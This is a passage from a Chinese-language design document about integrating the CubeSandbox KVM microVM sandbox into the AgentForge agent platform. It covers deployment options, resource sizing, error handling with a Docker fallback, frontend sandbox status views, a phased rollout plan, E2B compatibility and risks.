│  │ Sandbox      │    │  CubeProxy   (代理, TLS)        │   │
│  │  Manager     │    │  CubeVS      (eBPF 网络)        │   │
│  │              │    │                                   │   │
│  │  ┌────────┐  │    │  ┌────────────────────────────┐  │   │
│  │  │Cube    │  │    │  │  KVM MicroVM #1 (Python)   │  │   │
│  │  │Sandbox │  │    │  │  KVM MicroVM #2 (Node)     │  │   │
│  │  │Factory │  │    │  │  ...                        │  │   │
│  │  └────────┘  │    │  │  KVM MicroVM #N            │  │   │
│  └──────────────┘    │  └────────────────────────────┘  │   │
│                      └──────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### 9.2 部署选项

| 部署方式 | 适用场景 | 说明 |
|---------|---------|------|
| **同机部署** | 开发 / 小规模 | AgentForge + CubeSandbox 部署在同一台机器 |
| **同 VPC 部署** | 生产环境 | AgentForge 和 CubeSandbox 在同 VPC 不同机器 |
| **独立集群** | 多租户 / 大规模 | CubeSandbox 作为独立基础设施，多 AgentForge 实例共用 |

### 9.3 资源需求

| 规模 | CPU | 内存 | 磁盘 | 沙箱并发 |
|------|-----|------|------|---------|
| 开发环境 | 4 核 | 8 GB | 50 GB | 5 |
| 小规模生产 | 16 核 | 32 GB | 200 GB | 100 |
| 大规模生产 | 32 核 | 64 GB+ | 500 GB+ | 1000+ |

> **注意**：CubeSandbox 依赖 XFS 文件系统 + KVM，推荐 Ubuntu 22.04/24.04 或 OpenCloudOS 9。

---

## 10. 错误处理

### 10.1 错误类型映射

| 错误场景 | 异常类 | 处理策略 |
|----------|--------|---------|
| CubeSandbox API 不可达 | `SandboxUnavailableError` | 降级到 Docker，SSE 通知用户 |
| 沙箱创建失败 | `SandboxCreationError` | 记录日志，返回 500 |
| 沙箱已销毁但仍有执行请求 | `SandboxDestroyedError` | 返回 410 Gone |
| 代码执行超时 | `SandboxTimeoutError` | 截断输出，返回超时结果 |
| 沙箱 API Key 无效 | `SandboxAuthError` | 返回 401，通知管理员 |

### 10.2 降级策略

当 CubeSandbox 不可用时，AgentForge 自动降级到 Docker 沙箱：

```python
async def get_safe_executor(self) -> SandboxExecutor:
    """安全获取执行器，自动降级"""
    try:
        return await self._cube_executor.create()
    except SandboxUnavailableError as e:
        logger.warning(f"CubeSandbox unavailable, falling back to Docker: {e}")
        return await self._docker_executor.create()
    except SandboxAuthError:
        # 认证错误不降级，直接返回
        raise
```

---

## 11. 前端集成

### 11.1 沙箱状态指示器

在对话页增加沙箱状态标识：

```
[📦 CubeSandbox: sb-abc123 • 运行中 • TTL 剩 4:23]
```

点击可展开沙箱详情面板，展示：
- 沙箱 ID、模板 ID
- 运行时长、TTL 剩余
- 执行历史（代码块 + 输出）
- 手动暂停/销毁按钮

### 11.2 沙箱日志查看

在对话页侧边栏增加"沙箱日志"标签页：
- 实时查看沙箱 stdout/stderr
- 支持文件浏览（通过 `GET /sandboxes/:id/files` 新增 API）

---

## 12. 迁移与实施计划

### 12.1 Phase 1：基础对接（P2）

- [ ] 实现 `SandboxExecutor` 协议、`SandboxConfig`、`ConnectInfo`、`ExecResult` 数据类
- [ ] 实现 `MockSandboxExecutor`（本地开发用，无需 KVM，直接 subprocess 执行）
- [ ] 实现 `CubeSandboxE2BExecutor`（E2B SDK 路径）
- [ ] 实现 `CubeSandboxAPIExecutor`（REST API 路径）
- [ ] 修复 `SandboxManager`：executor 改为构造注入，`get_executor()` 拆为 `get_or_create()` + `execute()`
- [ ] 新增沙箱管理 API（§4.2）
- [ ] 配置支持（`CubeSandboxConfig`）
- [ ] 单元测试：基于 `MockSandboxExecutor` 覆盖生命周期、TTL、降级逻辑

**预期时间**：1 周

> **开发说明**：macOS 本地开发启用 `MockSandboxExecutor`（通过 `CUBE_SANDBOX_DEFAULT_PROVIDER=mock`），CI/CD 及集成测试在 Linux KVM 主机上运行真实 CubeSandbox。

### 12.2 Phase 2：Agent 集成（P2）

- [ ] Coder Agent 使用沙箱执行代码
- [ ] code_executor Skill 可选走 CubeSandbox
- [ ] SSE 事件扩展（沙箱生命周期）
- [ ] TTL 自动回收机制

**预期时间**：1 周

### 12.3 Phase 3：生产就绪（P1）

- [ ] 沙箱资源池化（热沙箱池）
- [ ] 前端沙箱管理 UI
- [ ] 多租户 API Key 隔离
- [ ] 集群部署支持
- [ ] 监控指标集成（Prometheus）

**预期时间**：2 周

---

## 13. 与 E2B 云服务的关系

CubeSandbox 是 E2B 的 **开源平替实现**。这意味着：

1. **代码完全兼容**：使用 `e2b-code-interpreter` 包，只需改 `E2B_DOMAIN` 环境变量
2. **可切换策略**：AgentForge 可同时配置 E2B 云服务和自建 CubeSandbox
3. **混合部署**：测试环境用 CubeSandbox，生产用 E2B 云服务（或反之）

```python
# 混合模式：支持同时配置 E2B 云和 CubeSandbox
E2B_API_KEY=e2b_xxxx            # E2B 云服务 Key
CUBE_SANDBOX_API_KEY=e2b_0000   # CubeSandbox 自部署 Key

# 策略：
# - 高优先级任务 → E2B 云服务（SLA 保障）
# - 常规任务 → CubeSandbox 自部署（低成本）
# - 高安全要求任务 → CubeSandbox（内核级隔离）
```

---

## 14. 关键风险与应对

| 风险 | 影响 | 应对 |
|------|------|------|
| CubeSandbox 依赖 KVM | 无法在 Docker 容器 / WSL 中开发 | 开发环境用 Docker 沙箱作为降级；CI/CD 用 KVM 主机 |
| CubeSandbox 仅支持 Linux | macOS 开发环境无法本地测试 | Phase 1 先实现 `MockSandboxExecutor`，本地开发走 mock；集成测试在 Linux CI 上跑真实 CubeSandbox |
| 模板构建复杂度高 | 需要定制包含 Python/Node 的模板 | 使用预构建模板 `sandbox-code:latest`，减少自建 |
| 部署运维成本 | 需要额外的基础设施运维 | 优先 Phase 1 轻量对接，生产环境再完整部署 |
| 快照磁盘空间 | CoW 快照消耗额外磁盘空间 | 定期清理过期快照，磁盘 >= 50GB |

---

## 15. 参考

- [CubeSandbox 官方文档](https://github.com/TencentCloud/CubeSandbox/blob/master/docs/zh/index.md)
- [CubeSandbox 架构概览](../../CubeSandbox/docs/zh/architecture/overview.md)
- [CubeSandbox 网络模型 (CubeVS)](../../CubeSandbox/docs/zh/architecture/network.md)
- [CubeSandbox 模板管理](../../CubeSandbox/docs/zh/guide/templates.md)
- [CubeSandbox 快速开始](../../CubeSandbox/docs/zh/guide/quickstart.md)
- [CubeSandbox 示例项目](../../CubeSandbox/docs/zh/guide/tutorials/examples.md)
- [E2B 官方文档](https://e2b.dev/docs)
- AgentForge 现有文档：[ARCHITECTURE.md](./ARCHITECTURE.md)、[SECURITY.md](./SECURITY.md)、[DEPLOYMENT.md](./DEPLOYMENT.md)、[API-SPEC.md](./API-SPEC.md)
